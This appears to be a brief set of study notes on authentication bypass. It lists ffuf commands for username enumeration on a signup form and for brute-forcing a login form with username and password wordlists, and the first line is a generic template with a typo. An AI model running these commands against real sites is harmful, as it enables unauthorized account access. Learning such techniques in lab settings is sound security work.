## Authentication Bypass

<pre>ffuf -w wordlist -X POST -d data -H header -u url mr mwssage</pre>
<pre>ffuf -w wordlist -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u url/signup -mr "username already exists"</pre>
<pre>ffuf -w username:W1,password:W2 -X POST -d "username=W1&email=x&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u url/login -fc 200</pre>
